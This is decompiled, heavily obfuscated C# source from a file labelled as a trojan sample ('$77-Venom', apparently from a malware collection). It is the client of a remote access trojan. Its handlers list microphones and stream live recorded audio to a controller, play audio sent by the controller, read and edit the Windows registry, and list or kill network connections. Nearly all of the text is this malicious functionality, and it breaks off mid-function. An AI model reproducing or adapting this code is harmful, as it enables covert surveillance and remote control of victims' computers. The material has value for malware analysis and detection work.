// Decompiled with JetBrains decompiler
// Type: 쌽㗕ၐ呴ꏟ杖쾧綠时�鯒�鸲ヸ⋉ሓ⋪鶊쎐
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.01-msil\HEUR-Trojan.MSIL.Zapchast.gen-defbae45ea8e71f8a50123f382f4538afc9db836de09bab316464d4793394f19.exe

using Microsoft.Win32;
using NAudio.Wave;
using System;
using System.Collections;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security;
using System.Threading;
using System.Windows.Forms;
using xClient.Core.AForge.Video.DirectShow;
using xClient.Core.NAudio.Wave;
using xClient.Core.NAudio.Wave.WaveInputs;
using xClient.Core.NAudio.Wave.WaveOutputs;
using xClient.Core.Packets.ClientPackets;
using xClient.Core.Packets.ServerPackets;
using xClient.Core.Registry;
using xClient.Core.Utilities;

public static class 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐
{
  public static bool 啣㲨쨢鵙랎曛ꘂ\uE481돽苋挩\u22BDﳁⲝ㴙卢괉遦\uFFFD\uEECD;
  public static bool 证杠\uF5E9泓\uFFFD\u2FE2㠷\uEA9B夔ꕛ涞ᧃ먖쾀診ﲽ헑\u24AA駽䰱;
  public static \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ 련蒷黙\u32DF菋鉐\uF86B\uEA72눌呸Č\u17EF\uEFBF柼藐뎟ꦷ抆镣萐;
  public static int 䀹\uEED1ئ갡軪\uFFFD嶧\uEB09흋\uFFFDٓ뜠㝓櫆䊞\uE2B3銑泦ﰁ셝;
  public static int 쮞Ӛ\u2984组ຯ\u2F51\uFFFD羓ⲻ禧ペ킀Ⳡ\uFFFDꏤ\u263A\uE383䖠져쮃;
  public static VideoCaptureDevice 蹾\uF2E4썈摨ㆹは廼\uE57DḘရ㞂\uE9C6炶稢码糉\u0A43椼ꧩ䎙;
  public static UnsafeStreamCodec \uF04C珷ᩜ妟梏\uFFFD舋䨏\uE3C7젶\uF730隩猊캍阊ﵩ籁쟯\uFFFD觾;
  private static Shell 飯녲閲賳֪뇭\u4DD5扝繖ᦸ襜铑좧\u17F9Ụ삊刞잚\uE062㚱;
  private static Dictionary<int, string> 螦섬쓮Ṣ녍퍆ᷯ쑘㒬䪕踃돖ᑰ臞嚺䛚㦋嘷嚠渢 = new Dictionary<int, string>();
  private static Dictionary<int, string> \u0033ၛ餰궐ꮬ눥\uDB8C\uDE6E럧\u1B69雺当\u10CB誧\uFFFD략홾\u02FD\uEDA5脒 = new Dictionary<int, string>();
  private const string \uFFFD搇牛㩩㕩錷\uEEEFᕓ\u0CF0穲\u0A54ꬋ\u2E87佶䲅唨ܴή\uEAB4勡 = "$E$";
  private static readonly System.Threading.Semaphore 曢ꌇ绾\uF707ไףּ곉\uE591윰ꋪ굣쨧팎㥢酢礍\uE753䂵ﴃ墋 = new System.Threading.Semaphore(2, 2);
  private const string 쒦ﮜ\u4DC3騚ꍁ擴坞\u2287ㆈ\uFBBD퉭뛽믋协돜훤確བኽ\u2F8C = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  private static readonly Random 蟮㓱ꄶ\u1C3E霑햨眔呍낕ﲂ\uEE45ﱵဌ熜\uF533וּ\uFFFD\uF229湬ﳉ = new Random(Environment.TickCount);

  private static WaveInEvent _waveInEvent { get; set; }

  public static bool StreamRunning { get; set; }

  private static BufferedWaveProvider WaveProvider { get; set; }

  private static WaveOut WaveOut { get; set; }

  public static void ꦓ镖ʂ趥㤠ꎁ쉼\uE358轊뤢欏ᾍ\uEEF7썤특흁崈扆淉権(
    GetAudioDevices command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    try
    {
      Dictionary<string, int> audioDevices = new Dictionary<string, int>();
      int deviceCount = WaveIn.DeviceCount;
      for (int devNumber = 0; devNumber < deviceCount; ++devNumber)
      {
        獇ᆉ\uFFFD䅹\uFFED鸹䦖ꣴ\u0FD2\u2E11轏薃嘮\uFFFD褾衾ᮔ䇾ؤ靅 capabilities = WaveIn.GetCapabilities(devNumber);
        audioDevices.Add(capabilities.ProductName, capabilities.Channels);
      }
      if (audioDevices.Count <= 0)
        return;
      new GetAudioDevicesResponse(audioDevices).Execute(client);
    }
    catch (Exception ex)
    {
    }
  }

  public static void 嚃귳ዦ蛝ⷦ퀽体犯න︇嬨䀬耽にཁৡ\u085F牯짲\uF369(
    GetAudioStream command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    // ISSUE: object of a compiler-generated type is created
    // ISSUE: variable of a compiler-generated type
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\u0DE0蓨\u33D9\uEE61ዅ茗즮鸠㴄洃姜쫶云岜㹁ﰛ儧䇭讉鯍 ዅ茗즮鸠㴄洃姜쫶云岜㹁ﰛ儧䇭讉鯍 = new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.\u0DE0蓨\u33D9\uEE61ዅ茗즮鸠㴄洃姜쫶云岜㹁ﰛ儧䇭讉鯍();
    // ISSUE: reference to a compiler-generated field
    ዅ茗즮鸠㴄洃姜쫶云岜㹁ﰛ儧䇭讉鯍.㭞\uEB94鸹\uF3FF雮큮쨈咐攭褵ᩤ쁶\uFFFD\u320D㟗嚞骧哩ࣾ笡 = client;
    try
    {
      蒹䔇ᚮ\uE740朁鸙宄䄨덈鸘㔌\uFFFDꀯ霤\uE673䞀\uF43A蠤计ሡ 蒹䔇ᚮ朁鸙宄䄨덈鸘㔌ꀯ霤䞀蠤计ሡ = new 蒹䔇ᚮ\uE740朁鸙宄䄨덈鸘㔌\uFFFDꀯ霤\uE673䞀\uF43A蠤计ሡ(command.SampleRate, command.Channels);
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐._waveInEvent = new WaveInEvent()
      {
        BufferMilliseconds = 50,
        DeviceNumber = command.Device,
        WaveFormat = 蒹䔇ᚮ朁鸙宄䄨덈鸘㔌ꀯ霤䞀蠤计ሡ
      };
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐._waveInEvent.StartRecording();
      // ISSUE: reference to a compiler-generated method
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐._waveInEvent.DataAvailable += new EventHandler<뜟\u0BA1悉ᖃ邎펶㬌遊㗍덪쑾\uFFFD\u33F7薂\uEB2D๊\uABFC\uFFFD\uFFFD䛕>(ዅ茗즮鸠㴄洃姜쫶云岜㹁ﰛ儧䇭讉鯍.\u08F6\u4DEA뫥\uE162拺횰㣳䍍ꋵ\uE254艌ᐺ\uFFFD땨\u2A3D\uF8FDۇ橠脙䚯);
    }
    catch (Exception ex)
    {
    }
  }

  public static void 騗᩻鎵ⰸ囑䔾\u292D䣔取䵝雙稌䅞繵\uEADA寇\u2F23鉑ᧁ\uF7F5(
    StopAudioStream command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    try
    {
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐._waveInEvent.StopRecording();
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐._waveInEvent.Dispose();
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.StreamRunning = false;
      new StopAudioStreamResponse(쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.StreamRunning).Execute(client);
    }
    catch (Exception ex)
    {
    }
  }

  public static void \uD994\uDEC3⁮\uE294嶌巢᳭\uF718뀊逸他힏恡걶\uF545\uE180\uFB3F\u0703\uE4BC\uE13D(
    DoSpeak command,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    try
    {
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.WaveOut = new WaveOut();
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.WaveProvider = new BufferedWaveProvider(new 蒹䔇ᚮ\uE740朁鸙宄䄨덈鸘㔌\uFFFDꀯ霤\uE673䞀\uF43A蠤计ሡ());
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.WaveOut.Init((魂盹聱्\u2731ꚕ\u3294㝮氎\u9FE9\uFFFDḼ\uEAEB\u309Bﭤ祖᷇葙\uEF8C詭) 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.WaveProvider);
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.WaveProvider.AddSamples(command.SpokenData, 0, command.SpokenData.Length);
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.WaveOut.Play();
    }
    catch (Exception ex)
    {
    }
  }

  public static void \uF102㴜溽\u286Eݢ砖\u3365䚗餬链쿐龎ú롁邱\uF477\uE433䤩禤Ꙕ(
    DoLoadRegistryKey packet,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    GetRegistryKeysResponse registryKeysResponse = new GetRegistryKeysResponse();
    try
    {
      RegistrySeeker registrySeeker = new RegistrySeeker();
      registrySeeker.BeginSeeking(packet.RootKeyName);
      registryKeysResponse.Matches = registrySeeker.Matches;
      registryKeysResponse.IsError = false;
    }
    catch (Exception ex)
    {
      registryKeysResponse.IsError = true;
      registryKeysResponse.ErrorMsg = ex.Message;
    }
    registryKeysResponse.RootKey = packet.RootKeyName;
    registryKeysResponse.Execute(client);
  }

  public static void \uA671\uF3B6麙㸙\uE987瓲야㡋ꬡ谀\uF32A臈\uF667膨婝䰘뤨销椪眖(
    DoCreateRegistryKey packet,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    GetCreateRegistryKeyResponse registryKeyResponse = new GetCreateRegistryKeyResponse();
    string errorMsg = "";
    string name = "";
    try
    {
      registryKeyResponse.IsError = !RegistryEditor.CreateRegistryKey(packet.ParentPath, out name, out errorMsg);
    }
    catch (Exception ex)
    {
      registryKeyResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryKeyResponse.ErrorMsg = errorMsg;
    registryKeyResponse.Match = new RegSeekerMatch(name, \u055D樥ꀃ隃猠廬௧䖞䓨\uF625껟狯\uE8C2詢腑\u292F\u0F1B敭옽\u0CE5.\u27C3똖ꑱ\uE25D鞻毹燌빬\uFFFD搲偈믦쳜뱗窔\uFAF0䋳\uE0AC檊㣒(), 0);
    registryKeyResponse.ParentPath = packet.ParentPath;
    registryKeyResponse.Execute(client);
  }

  public static void 倝呂\u0025脞羅有\u2F1B쥽\u268E\uFD49ẃ畔ϋ옂\uFFFD\uFFFD鮈\uFFFD蹿ﳴ(
    DoDeleteRegistryKey packet,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    GetDeleteRegistryKeyResponse registryKeyResponse = new GetDeleteRegistryKeyResponse();
    string errorMsg = "";
    try
    {
      registryKeyResponse.IsError = !RegistryEditor.DeleteRegistryKey(packet.KeyName, packet.ParentPath, out errorMsg);
    }
    catch (Exception ex)
    {
      registryKeyResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryKeyResponse.ErrorMsg = errorMsg;
    registryKeyResponse.ParentPath = packet.ParentPath;
    registryKeyResponse.KeyName = packet.KeyName;
    registryKeyResponse.Execute(client);
  }

  public static void 꺪ꁺ痡鞶뎐䈌\uE0FA魺\uEBCBᤷ䢗㘌\uFFFD跭鵺\u2050ᛳ헶〼鮽(
    DoRenameRegistryKey packet,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    GetRenameRegistryKeyResponse registryKeyResponse = new GetRenameRegistryKeyResponse();
    string errorMsg = "";
    try
    {
      registryKeyResponse.IsError = !RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg);
    }
    catch (Exception ex)
    {
      registryKeyResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryKeyResponse.ErrorMsg = errorMsg;
    registryKeyResponse.ParentPath = packet.ParentPath;
    registryKeyResponse.OldKeyName = packet.OldKeyName;
    registryKeyResponse.NewKeyName = packet.NewKeyName;
    registryKeyResponse.Execute(client);
  }

  public static void 륜촚\u4DF1㟃舣륆\u2BD6ﹹ풳骷\u2143搲\uFFFD\u2799璉ꦺ芤㷟\u28F7逸(
    DoCreateRegistryValue packet,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    GetCreateRegistryValueResponse registryValueResponse = new GetCreateRegistryValueResponse();
    string errorMsg = "";
    string name = "";
    try
    {
      registryValueResponse.IsError = !RegistryEditor.CreateRegistryValue(packet.KeyPath, packet.Kind, out name, out errorMsg);
    }
    catch (Exception ex)
    {
      registryValueResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryValueResponse.ErrorMsg = errorMsg;
    registryValueResponse.Value = new RegValueData(name, packet.Kind, packet.Kind.GetDefault());
    registryValueResponse.KeyPath = packet.KeyPath;
    registryValueResponse.Execute(client);
  }

  public static void 컶\uFDFE\u139Aꭸ㸓\uE4C8ꩭ롤\uEA98櫰\uFF20\uFFFD濘蛬\u2B76ꪃ\uFBC2\u0B04撾焮(
    DoDeleteRegistryValue packet,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    GetDeleteRegistryValueResponse registryValueResponse = new GetDeleteRegistryValueResponse();
    string errorMsg = "";
    try
    {
      registryValueResponse.IsError = !RegistryEditor.DeleteRegistryValue(packet.KeyPath, packet.ValueName, out errorMsg);
    }
    catch (Exception ex)
    {
      registryValueResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryValueResponse.ErrorMsg = errorMsg;
    registryValueResponse.ValueName = packet.ValueName;
    registryValueResponse.KeyPath = packet.KeyPath;
    registryValueResponse.Execute(client);
  }

  public static void 囮\uFFFDﭡ㦙抪큺\u3313\uFFFD\uE70A훱줖\uE355롰\uE95Cᷱ\u2631趔題朋\uED17(
    DoRenameRegistryValue packet,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    GetRenameRegistryValueResponse registryValueResponse = new GetRenameRegistryValueResponse();
    string errorMsg = "";
    try
    {
      registryValueResponse.IsError = !RegistryEditor.RenameRegistryValue(packet.OldValueName, packet.NewValueName, packet.KeyPath, out errorMsg);
    }
    catch (Exception ex)
    {
      registryValueResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryValueResponse.ErrorMsg = errorMsg;
    registryValueResponse.KeyPath = packet.KeyPath;
    registryValueResponse.OldValueName = packet.OldValueName;
    registryValueResponse.NewValueName = packet.NewValueName;
    registryValueResponse.Execute(client);
  }

  public static void 丯\uFFFD\uE822奝\uF2E0밶練\uEFED鎏螝ׂ잍\uED13ꋷ欀倔ퟘ\u2E30ⱄ\u3296(
    DoChangeRegistryValue packet,
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client)
  {
    GetChangeRegistryValueResponse registryValueResponse = new GetChangeRegistryValueResponse();
    string errorMsg = "";
    try
    {
      registryValueResponse.IsError = !RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg);
    }
    catch (Exception ex)
    {
      registryValueResponse.IsError = true;
      errorMsg = ex.Message;
    }
    registryValueResponse.ErrorMsg = errorMsg;
    registryValueResponse.KeyPath = packet.KeyPath;
    registryValueResponse.Value = packet.Value;
    registryValueResponse.Execute(client);
  }

  public static void 瑙鑖췠礅払귐\u28F6യ\u2755䯣鳂\u2F13㺧쵹著䴭펮篅\u1878ꪡ(
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client,
    GetConnections packet)
  {
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.敔ݤ㘲ꅨ䎉뢒\u001FሲƆ젟捽ᥡ\uE152뉨톹\uE401픂ꢟ晹ꎧ[] 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray = 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.銺伧ᐅ\uF276\uF872菱\uEA83㲊\u33B3醧續\u1AC7솤蒧䈘\u303E뛀\u2F39듷犛();
    string[] processes = new string[敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray.Length];
    string[] localaddresses = new string[敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray.Length];
    string[] localports = new string[敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray.Length];
    string[] remoteadresses = new string[敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray.Length];
    string[] remoteports = new string[敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray.Length];
    byte[] states = new byte[敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray.Length];
    for (int index = 0; index < 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray.Length; ++index)
    {
      localaddresses[index] = 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray[index].LocalAddress.ToString();
      localports[index] = 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray[index].LocalPort.ToString();
      remoteadresses[index] = 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray[index].RemoteAddress.ToString();
      remoteports[index] = 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray[index].RemotePort.ToString();
      states[index] = Convert.ToByte(敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray[index].跒弆\uE719종侀\u25FC噰\u2010\uF30C䠚荣럘ᅺ덪䄧ᰩ贶\u2D75ፎ艚);
      try
      {
        Process processById = Process.GetProcessById((int) 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray[index].\u2444貥젞忮郹怲ʀ\u3321\uEDD4뢜好䔓悙떯㒔ᵓ\u2BCB扑麽況);
        processes[index] = processById.ProcessName;
      }
      catch
      {
        processes[index] = string.Format("PID: {0}", (object) 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray[index].\u2444貥젞忮郹怲ʀ\u3321\uEDD4뢜好䔓悙떯㒔ᵓ\u2BCB扑麽況);
      }
    }
    new GetConnectionsResponse(processes, localaddresses, localports, remoteadresses, remoteports, states).Execute(client);
  }

  public static void \uA62Cヷ汢ﵮ鰻퓻\uFFFD楔䔄䦽ø莽\uF56C倢ᆅ棒ͻ侨\uF2ECᢈ(
    \u3100\uFFFD稾\uE4FB\u2F06涧ᒲ볡ꤏ硔鬆愆岇樌笱ộ婸\uEC5C囈භ client,
    DoCloseConnection packet)
  {
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.敔ݤ㘲ꅨ䎉뢒\u001FሲƆ젟捽ᥡ\uE152뉨톹\uE401픂ꢟ晹ꎧ[] 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray = 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.銺伧ᐅ\uF276\uF872菱\uEA83㲊\u33B3醧續\u1AC7솤蒧䈘\u303E뛀\u2F39듷犛();
    bool flag = false;
    for (int index = 0; index < 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray.Length; ++index)
    {
      int num1 = packet.LocalPort;
      string str1 = num1.ToString();
      ushort num2 = 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray[index].LocalPort;
      string str2 = num2.ToString();
      if (str1 == str2)
      {
        num1 = packet.RemotePort;
        string str3 = num1.ToString();
        num2 = 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray[index].RemotePort;
        string str4 = num2.ToString();
        if (str3 == str4)
        {
          flag = true;
          敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray[index].跒弆\uE719종侀\u25FC噰\u2010\uF30C䠚荣럘ᅺ덪䄧ᰩ贶\u2D75ፎ艚 = 12U;
          IntPtr num3 = Marshal.AllocCoTaskMem(Marshal.SizeOf((object) 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray[index]));
          Marshal.StructureToPtr((object) 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray[index], num3, false);
          쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.셼\u9FF3蚊蕉㕑ﯞԐ\uE97A\u2615Ɉꡣ摷懹ꪣ\uE4A2ㄷ輢봅જ睔(num3);
        }
      }
    }
    if (!flag)
      return;
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.瑙鑖췠礅払귐\u28F6യ\u2755䯣鳂\u2F13㺧쵹著䴭펮篅\u1878ꪡ(client, new GetConnections());
  }

  public static 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.敔ݤ㘲ꅨ䎉뢒\u001FሲƆ젟捽ᥡ\uE152뉨톹\uE401픂ꢟ晹ꎧ[] 銺伧ᐅ\uF276\uF872菱\uEA83㲊\u33B3醧續\u1AC7솤蒧䈘\u303E뛀\u2F39듷犛()
  {
    int ipVersion = 2;
    int dwOutBufLen = 0;
    int num1 = (int) 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.滦ᨬ\u221A폾佱剤鯈\uFFFDⰝ\uEB4D쪯ꜰ祐柴鉶ﷂ\uFFFD\u2731쟙邇(IntPtr.Zero, ref dwOutBufLen, true, ipVersion, 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.ޓ핏゙\uED53\uF8B1젹\uF1CF簠լ懶풙퀂䇜ᆨ唳㲉衆䃃\u22BF鲖.洉ﮏ姎㧏鑭ㅶ댥헖蔋ᘼঙB蹨鋡絁ッ館燓\u2406㤝);
    IntPtr num2 = Marshal.AllocHGlobal(dwOutBufLen);
    쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.敔ݤ㘲ꅨ䎉뢒\u001FሲƆ젟捽ᥡ\uE152뉨톹\uE401픂ꢟ晹ꎧ[] 敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray;
    try
    {
      if (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.滦ᨬ\u221A폾佱剤鯈\uFFFDⰝ\uEB4D쪯ꜰ祐柴鉶ﷂ\uFFFD\u2731쟙邇(num2, ref dwOutBufLen, true, ipVersion, 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.ޓ핏゙\uED53\uF8B1젹\uF1CF簠լ懶풙퀂䇜ᆨ唳㲉衆䃃\u22BF鲖.洉ﮏ姎㧏鑭ㅶ댥헖蔋ᘼঙB蹨鋡絁ッ館燓\u2406㤝) != 0U)
        return (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.敔ݤ㘲ꅨ䎉뢒\u001FሲƆ젟捽ᥡ\uE152뉨톹\uE401픂ꢟ晹ꎧ[]) null;
      쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.蓀\u0FF2됳瞤䊣聁줘\u2CF7韠̔姄\u248C鏍\uE252\u272BƉ澡犣紅褻 structure1 = (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.蓀\u0FF2됳瞤䊣聁줘\u2CF7韠̔姄\u248C鏍\uE252\u272BƉ澡犣紅褻) Marshal.PtrToStructure(num2, typeof (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.蓀\u0FF2됳瞤䊣聁줘\u2CF7韠̔姄\u248C鏍\uE252\u272BƉ澡犣紅褻));
      IntPtr ptr = (IntPtr) ((long) num2 + (long) Marshal.SizeOf((object) structure1.䇗聸\u22A0䪊\u4DF4늭숄栙쌔誜㐄谎υ으자ﮉ\uEB0E\u1BF8\uFFFD尅));
      敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray = new 쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.敔ݤ㘲ꅨ䎉뢒\u001FሲƆ젟捽ᥡ\uE152뉨톹\uE401픂ꢟ晹ꎧ[(int) structure1.䇗聸\u22A0䪊\u4DF4늭숄栙쌔誜㐄谎υ으자ﮉ\uEB0E\u1BF8\uFFFD尅];
      for (int index = 0; (long) index < (long) structure1.䇗聸\u22A0䪊\u4DF4늭숄栙쌔誜㐄谎υ으자ﮉ\uEB0E\u1BF8\uFFFD尅; ++index)
      {
        쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.敔ݤ㘲ꅨ䎉뢒\u001FሲƆ젟捽ᥡ\uE152뉨톹\uE401픂ꢟ晹ꎧ structure2 = (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.敔ݤ㘲ꅨ䎉뢒\u001FሲƆ젟捽ᥡ\uE152뉨톹\uE401픂ꢟ晹ꎧ) Marshal.PtrToStructure(ptr, typeof (쌽㗕ၐ呴ꏟ杖쾧綠时\uFFFD鯒\uFFFD鸲ヸ\uF83E\u22C9ሓ\u22EA鶊쎐.敔ݤ㘲ꅨ䎉뢒\u001FሲƆ젟捽ᥡ\uE152뉨톹\uE401픂ꢟ晹ꎧ));
        敔ݤ㘲ꅨ䎉뢒ሲƆ젟捽ᥡ뉨톹픂ꢟ晹ꎧArray[index] = structure2;
